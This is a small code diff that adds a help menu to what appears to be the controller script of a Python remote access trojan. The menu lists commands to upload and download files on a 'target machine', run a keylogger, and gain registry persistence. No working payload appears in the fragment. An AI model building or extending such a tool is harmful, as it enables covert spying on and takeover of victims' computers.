@@ -32,6 +32,16 @@ def target_communication():
         if command == "quit":
             print(termcolor.colored(f"(#) exiting {ip} machine (#)",  'yellow'))
             break
+        elif command == "help":
+            print('''
+            quit ~ quit section
+            clear ~ clear screen
+            upload *file name* ~ upload file to target machine
+            download *file name* ~ download file from target machine
+            keylogger -s ~ start keylogger
+            keylloger -p ~ print inputed keys
+            keylogger -stop ~ stop keylogger
+            persistence *RegName* *FileName* ~ create register in registry''')
         result = reliable_rcv()
         print(result)
     
